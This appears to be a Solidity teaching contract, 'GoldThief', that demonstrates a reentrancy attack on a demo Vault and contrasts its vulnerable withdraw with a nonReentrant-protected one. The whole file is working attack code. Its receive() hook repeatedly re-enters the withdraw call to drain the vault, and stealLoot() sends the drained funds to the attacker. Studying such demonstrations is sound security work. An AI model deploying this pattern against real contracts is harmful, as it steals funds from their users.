// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Interface for the target Vault
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

/**
 * @title GoldThief
 * @notice Simulates a malicious contract attempting a reentrancy attack.
 */
contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    /// @notice Attack a vulnerable (non-reentrant) Vault
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    /// @notice Try to attack a protected (reentrant-safe) Vault
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    /// @notice Fallback triggered on receiving ETH — where reentrancy happens
    receive() external payable {
        attackCount++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            // Re-enter vulnerable withdraw
            targetVault.vulnerableWithdraw();
        }

        if (attackingSafe) {
            // This will fail because safeWithdraw uses nonReentrant
            targetVault.safeWithdraw();
        }
    }

    /// @notice Withdraw all stolen funds to attacker wallet
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    /// @notice See how much ETH this contract currently holds
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}